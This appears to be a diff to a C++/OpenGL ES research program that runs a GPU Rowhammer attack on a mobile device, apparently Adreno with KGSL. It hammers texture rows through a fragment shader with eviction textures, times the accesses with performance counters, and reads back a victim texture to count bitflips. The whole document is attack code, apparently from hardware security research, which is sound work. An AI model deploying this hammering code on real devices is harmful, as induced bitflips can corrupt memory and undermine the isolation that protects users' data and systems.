@@ -176,15 +176,22 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"void main(){\n"
 	"	int id = int(threadD.x) % 10;\n"
 	"	id = id * 4096;\n"
-	"	for(int i = 0; i < 2000000; ++i){\n"
+	"	for(int i = 0; i < 20; ++i){\n"
 	"		\n"
-	"			FragColor = texelFetch(row1, ivec2(0,0), 0);\n"
-	"			FragColor = texelFetch(row2, ivec2(0, 0), 0);\n"
+	"		FragColor += texelFetch(row1, ivec2(0,0), 0);\n"
+	"		FragColor += texelFetch(row2, ivec2(0, 0), 0);\n"
 	"		\n"
-	"		FragColor = texelFetch(evict1, ivec2(id % 256, int(id / 256)), 0);\n"
-	"		FragColor = texelFetch(evict1, ivec2(id % 256 + 32 , int(id / 256)), 0);\n"
+	"		FragColor += texelFetch(evict1, ivec2(id % 1024 * 4, int(id / 1024) * 4), 0);\n"
+	"		FragColor += texelFetch(evict1, ivec2(id % 1024 * 4 + 32 , int(id / 1024) * 4), 0);\n"
 	"	}\n"
 	"}\n\0";
+
+const char *hammeringVertexShaderSource = "#version 300 es\n"
+	"uniform vec2 a_rnd;\n"
+	"void main()\n"
+	"{\n"
+	"   gl_Position = vec4(0, 0, 0.f, 1.0);\n"
+	"}\0";
 
 
 
@@ -480,6 +487,17 @@ int main(){
 
 	// Native bit flip ...
 
+	
+	vertexShader = glCreateShader(GL_VERTEX_SHADER);
+	glShaderSource(vertexShader, 1, &hammeringVertexShaderSource, NULL);
+	glCompileShader(vertexShader);
+	glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &success);
+
+ 	if (success != GL_TRUE){
+        	glGetShaderInfoLog(vertexShader, 512, NULL, infoLog);
+	        std::cout << "ERROR::SHADER::VERTEX::COMPILATION_FAILED\n" << infoLog << std::endl;
+	}
+
 	fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);
 	glShaderSource(fragmentShader, 1, &hammeringShaderSource, NULL);
 	glCompileShader(fragmentShader);   	
@@ -491,16 +509,18 @@ int main(){
 		exit(1);
 	}
 
-	glAttachShader(shaderProgram, fragmentShader);
-	glLinkProgram(shaderProgram);
+	glAttachShader(shaderProgram2, vertexShader);
+	glAttachShader(shaderProgram2, fragmentShader);
+	glLinkProgram(shaderProgram2);
 
-	glGetProgramiv(shaderProgram, GL_LINK_STATUS, &success);
+	glGetProgramiv(shaderProgram2, GL_LINK_STATUS, &success);
 	if (!success) {
-		glGetProgramInfoLog(shaderProgram, 512, NULL, infoLog);
+		glGetProgramInfoLog(shaderProgram2, 512, NULL, infoLog);
 		std::cout << "ERROR::SHADER::PROGRAM::LINKING_FAILED\n" << infoLog << std::endl;
 		exit(1);
 	}
 	glDeleteShader(fragmentShader);
+	glDeleteShader(vertexShader);
 	int bitflips = 0;
 	for(size_t i = 0; i < cont_kgsls; ++i){
 		// preparing program to run
@@ -526,12 +546,12 @@ int main(){
 			glClear(GL_COLOR_BUFFER_BIT);
 			glUseProgram(shaderProgram2);
 			glVertexAttribPointer(0, 10, GL_INT, GL_FALSE, 3 * sizeof(int), (void*)0);
-				glEnableVertexAttribArray(0);
+			glEnableVertexAttribArray(0);
 
 			// Binding textures
-			GLuint row1TexLocation = glGetUniformLocation(shaderProgram, "row1");
-			GLuint row2TexLocation  = glGetUniformLocation(shaderProgram, "row2");
-			GLuint evictionTexLocation  = glGetUniformLocation(shaderProgram, "evict1");
+			GLuint row1TexLocation = glGetUniformLocation(shaderProgram2, "row1");
+			GLuint row2TexLocation  = glGetUniformLocation(shaderProgram2, "row2");
+			GLuint evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict1");
 
 
 			glUniform1i(row1TexLocation, 0);
@@ -548,7 +568,6 @@ int main(){
 			glActiveTexture(GL_TEXTURE0 + 2); // eviction Texture Unit
 			glBindTexture(GL_TEXTURE_2D, tex2[EVICTTEXT]);
 			printf("Trying to hammer chunk %d : %d\n", i, k);
-			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, victim->kgsl_id, 0);
 			
 			// running the program
 			GLuint group[2];
@@ -557,20 +576,20 @@ int main(){
 			GLuint *counterData;
 			unsigned int resultSize;
 			getCounterByName("VBIF", "AXI_READ_REQUESTS_TOTAL", &group[0],&counter[0]);
-    		// getCounterByName("UCHE", "UCHE_UCHEPERF_VBIF_READ_BEATS_TP", &group[0],&counter[0]);
-    		getCounterByName("TP", "TPL1_TPPERF_TP0_L1_REQUESTS", &group[1],&counter[1]);
-    		glGenPerfMonitorsAMD(1, &monitor);
+    			// getCounterByName("UCHE", "UCHE_UCHEPERF_VBIF_READ_BEATS_TP", &group[0],&counter[0]);
+    			getCounterByName("TP", "TPL1_TPPERF_TP0_L1_REQUESTS", &group[1],&counter[1]);
+    			glGenPerfMonitorsAMD(1, &monitor);
 			glSelectPerfMonitorCountersAMD(monitor, GL_TRUE, group[0], 1 ,&counter[0]);   
-        	glSelectPerfMonitorCountersAMD(monitor, GL_TRUE, group[1], 1 ,&counter[1]);   
-	        glBeginPerfMonitorAMD(monitor);    
-			glDrawArrays(GL_POINTS, 0, 1);
-	        glEndPerfMonitorAMD(monitor);
+        		glSelectPerfMonitorCountersAMD(monitor, GL_TRUE, group[1], 1 ,&counter[1]);   
+	        	glBeginPerfMonitorAMD(monitor);    
+			glDrawArrays(GL_POINTS, 0, 10);
+		        glEndPerfMonitorAMD(monitor);
 			usleep(1000);
-	        glGetPerfMonitorCounterDataAMD(monitor, GL_PERFMON_RESULT_SIZE_AMD, sizeof(GLint), (GLuint*)&resultSize, NULL);
+	        	glGetPerfMonitorCounterDataAMD(monitor, GL_PERFMON_RESULT_SIZE_AMD, sizeof(GLint), (GLuint*)&resultSize, NULL);
  			if(!resultSize){
-            	printf("RESULTSIZE == 0...\n");
-            	return -1;
-        	}
+		            	printf("RESULTSIZE == 0...\n");
+        	    		return -1;
+	        	}
 			counterData = (GLuint*) malloc(resultSize);
 			GLsizei bytesWritten;
 			glGetPerfMonitorCounterDataAMD(monitor, GL_PERFMON_RESULT_AMD,  resultSize, counterData, &bytesWritten);
@@ -605,6 +624,7 @@ int main(){
         	printf("\n");
 			
 			
+			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, victim->kgsl_id, 0);
 			unsigned int* frame2  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
 			memset(frame2, 0x00, 32 * 32 * sizeof(unsigned int));
 			glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
